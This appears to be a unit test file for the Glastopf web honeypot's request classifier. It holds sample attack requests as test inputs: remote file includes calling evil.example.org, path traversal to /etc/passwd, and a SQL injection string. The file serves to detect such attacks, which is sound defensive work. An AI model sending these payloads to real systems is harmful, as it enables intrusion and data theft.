# Copyright (C) 2015 Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import os
import tempfile
import shutil

from glastopf.modules.HTTP.handler import HTTPHandler
from glastopf.glastopf import GlastopfHoneypot
import glastopf.modules.classification.request as request_classifier


class TestClassifier(unittest.TestCase):
    """Test the behaviour of the Classifier class based on the rules
    defined into the requests.xml to detect the attack pattern
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        data_dir = os.path.join(self.tmpdir, 'data')
        GlastopfHoneypot.prepare_environment(self.tmpdir)
        self.requestClassifier = request_classifier.Classifier(data_dir)

    def tearDown(self):
        if os.path.isdir(self.tmpdir):
            shutil.rmtree(self.tmpdir)

    def test_robots_classifier(self):
        """Objective: Test classifier for robots.txt requests
        Input: HTTPRequest with an robots.txt GET request
        Expected Response: matched pattern to robots
        Note: """

        httphandler = HTTPHandler('GET /robots.txt HTTP/1.0', None)

        matched_pattern = self.requestClassifier.classify_request(httphandler)
        self.assertTrue(matched_pattern == 'robots', '{0} did not match expected pattern'.format(matched_pattern))

    def test_rfi_classifier(self):
        """Objective: Test classifier for RFI requests
        Input: HTTPRequest with different kind of remote file includes attempts
        Expected Response: matched pattern to rfi
        Note: """

        intput_paths = ('/index.php?file=http://evil.example.org/t.txt?',
                        '/index.php?file=%20http://evil.example.org/t.txt?',
                        '/index.php?file=https://evil.example.org/t.txt?',
                        '/index.php?file=ftp://evil.example.org/t.txt?,'
                        '/index.php?file=ftps://evil.example.org/t.txt?',
                        're/test.jsp?r=%22http://www.gogole.it/')

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'rfi', '{0} did not match expected pattern'.format(matched_pattern))

    def test_lfi_classifier(self):
        """Objective: Test classifier for LFI requests
        Input: HTTPRequest with different kind of local file includes attempts
        Expected Response: matched pattern to rfi
        Note: """

        intput_paths = ('/index.php?file=../../../../../../etc/passwd',
                        '/index.php?file=../../../../../../etc/passwd%00')

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'lfi', '{0} did not match expected pattern'.format(matched_pattern))

    def test_phpmyadmin_classifier(self):
        """Objective: Test classifier for phpmyadmin requests
        Input: HTTPRequest with a generic reference to phpmyadmin paths
        Expected Response: matched pattern to phpmyadmin
        Note: """

        intput_paths = ('/phpmyadmin/',
                        '/phpMyadmin/',
                        '/pma/',
                        '/PMA',
                        '/phpMyAdmin-2.8.2/')

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'phpmyadmin', '{0} did not match expected pattern'.format(matched_pattern))

    def test_sqli_classifier(self):
        """Objective: Test classifier for SQL Injection requests
        Input: HTTPRequest with a generic sql injection attempt
        Expected Response: matched pattern to sqli
        Note: """

        intput_paths = ('/index.php?id=anything"%20OR%20"x"="x";',)

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'sqli', '{0} did not match expected pattern'.format(matched_pattern))

    def test_login_classifier(self):
        """Objective: Test classifier for login requests
        Input: HTTPRequest with a generic authentication login attempt
        Expected Response: matched pattern to login
        Note: """

        intput_paths = ('/login',)

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'login', '{0} did not match expected pattern'.format(matched_pattern))

    def test_phpinfo_classifier(self):
        """Objective: Test classifier for phpinfo debug/test requests
        Input: HTTPRequest with an attempt to discover a generic phpinfo test page
        Expected Response: matched pattern to phpinfo
        Note: """

        intput_paths = ('/phpinfo.php?ss',
                        '/phpinfo.php',
                        '/info.php',
                        '/info.php?page',
                        '/phpinfo.html')

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'phpinfo', '{0} did not match expected pattern'.format(matched_pattern))

if __name__ == '__main__':
    unittest.main()
